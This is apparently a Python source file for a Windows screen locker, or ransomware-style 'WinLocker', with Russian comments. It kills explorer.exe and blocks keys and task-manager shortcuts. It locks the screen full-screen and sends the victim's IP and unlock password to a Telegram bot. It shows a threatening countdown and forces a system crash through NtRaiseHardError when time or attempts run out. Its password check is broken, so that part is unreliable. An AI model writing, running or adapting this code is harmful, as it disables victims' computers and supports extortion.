import tkinter as tk
from tkinter import messagebox
import datetime
import ctypes
import keyboard
import random
import requests
import socket
import requests
from bs4 import BeautifulSoup
import subprocess

# Завершаем процесс explorer.exe
subprocess.call("taskkill /f /im explorer.exe", shell=False)




keyboard.block_key('Delete')
url = 'https://check-host.net/ip'  # замените на нужный URL
response = requests.get(url)
soup = BeautifulSoup(response.content, 'html.parser')
ip_address = soup.get_text()

id = random.randint(1, 1000)
random_number = random.randint(1, 1000000)
# Отправляем сообщение в телеграм-бот
bot_token = '6840517383:AAEEZajj1Pcx-S-111111111111'  # Замените на свой токен
chat_id = '111111111'  # Замените на свой ID чата

message = f'Сгенерирован пароль: pwd{random_number}\nIP-адрес: {ip_address}\nID: {id}'
pwd = f'pwd{random_number}'
telegram_api = f'https://api.telegram.org/bot{bot_token}/sendMessage'
params = {'chat_id': chat_id, 'text': message}
requests.get(telegram_api, params=params)




def disable_close_event(event):
    keysym = event.keysym
    if (event.state == 12 and keysym == "Delete") or (event.state == 12 and keysym == "Escape"):
        return "break"
    


all_keys = list(range(32, 127))
for key in all_keys:
    keyboard.block_key(key)
    keyboard.add_hotkey('ctrl+alt+delete', lambda: None)
    keyboard.add_hotkey('ctrl+shift+esc', lambda: None)


class WinLocker:
    def __init__(self, master):
        self.master = master
        self.master.attributes("-fullscreen", True)
        self.master.title("Win Locker")
        
        bg_color = "#000000"
        fg_color = "#FFFFFF"
        font_family = "Arial"
        
        self.master.configure(background=bg_color)
        
        tk.Label(self.master, text=f"Don't be sad, bruh. ID: {id}", font=(font_family, 50), fg=fg_color, bg=bg_color).pack(pady=50)

        password_entry = tk.Entry(self.master, show="*", bg=fg_color, font=(font_family, 30))
        password_entry.pack()
        password_entry.focus_set()

        tk.Label(self.master, text=" ", font=(font_family, 20), fg=fg_color, bg=bg_color).pack(pady=10)
        tk.Label(self.master, text="Enter the password or the system will delete when the timer expires.", font=(font_family, 20), fg=fg_color, bg=bg_color).pack(pady=10)
        
        unlock_button = tk.Button(self.master, text="Unlock", command=self.unlock, bg=fg_color, font=(font_family, 20))
        unlock_button.pack(pady=20)

        hint_button = tk.Button(self.master, text="How do I get the password?", command=self.show_hint, bg="#00FF00", font=(font_family, 20))
        hint_button.pack(pady=20)
        
        self.wrong_password_label = tk.Label(self.master, text="Wrong password!", fg="red", bg=bg_color, font=(font_family, 20))
        self.wrong_password_label.pack_forget()
        
        self.remaining_time_label = tk.Label(self.master, text="Time remaining: 3:00:00", font=(font_family, 20), fg=fg_color, bg=bg_color)
        self.remaining_time_label.pack()
        
        self.count = 0
        self.max_attempts = 100
        self.attempts_left_label = tk.Label(self.master, text=f"Attempts left:{self.max_attempts}", font=(font_family, 20), fg=fg_color, bg=bg_color)
        self.attempts_left_label.pack()
        
        # Add keypad buttons
        buttons_frame = tk.Frame(self.master)
        buttons_frame.pack(pady=20)

        for i in range(1, 11):
            button = tk.Button(buttons_frame, text=str(i), command=lambda x=i: self.add_to_password_entry(x), bg=fg_color, font=(font_family, 20))
            button.configure(bg=bg_color, fg=fg_color)
            button.pack(side=tk.LEFT, padx=10)

            clear_button = tk.Button(self.master, text="Clear the password field", command=self.clear_password_entry, bg="#FF0000", font=(font_family, 20))
        clear_button.pack(pady=20)

    def add_to_password_entry(self, number):
        password_entry = self.master.children['!entry']
        password_entry.insert(tk.END, str(number))

    def clear_password_entry(self):
        password_entry = self.master.children['!entry']
        password_entry.delete(0, tk.END)

    def show_hint(self):
        messagebox.showinfo("Getting the unlock password", "And there's no hint : )")
        
            
    def unlock(self, event=None):
        password = self.master.children['!entry'].get().strip()
        if password == random_number or 123:
            messagebox.showinfo("Access unblocked!", "You have unblocked access to the system! \nPress OK to close the blocker.)")
            self.master.destroy()
            subprocess.call(["explorer.exe"],shell=False)

        else:
            self.count += 1
            attempts_left = max(0, self.max_attempts - self.count)
            self.attempts_left_label.config(text=f"Attempts left: {attempts_left}")
            
            if self.count >= self.max_attempts:
                ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
            else:
                self.wrong_password_label.pack()

    def run(self):
        self.start_time = datetime.datetime.now()
        self.update_remaining_time()
        self.master.mainloop()
        
    def update_remaining_time(self):
        elapsed_time = (datetime.datetime.now() - self.start_time).seconds
        remaining_seconds = max(0, 3 * 60 * 60 - elapsed_time)
        remaining_hours = remaining_seconds // 3600
        remaining_minutes = (remaining_seconds % 3600) // 60
        remaining_seconds %= 60
        self.remaining_time_label.config(text=f"There's time left: {remaining_hours:02d}:{remaining_minutes:02d}:{remaining_seconds:02d}")
        if remaining_seconds > 0 or remaining_minutes > 0 or remaining_hours > 0:
            self.master.after(1000, self.update_remaining_time)
        else:
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
            
if __name__ == '__main__':
    root = tk.Tk()
    root.grab_set()
    root.bind_all("<KeyPress>", disable_close_event)
    root.attributes("-topmost", True)  # Делаем окно поверх всех окон
    root.focus_force()  # Фокус на окно
    root.lift()  # Также делаем окно поверх всех окон
    root.focus_force()
    locker = WinLocker(root)
    locker.run()
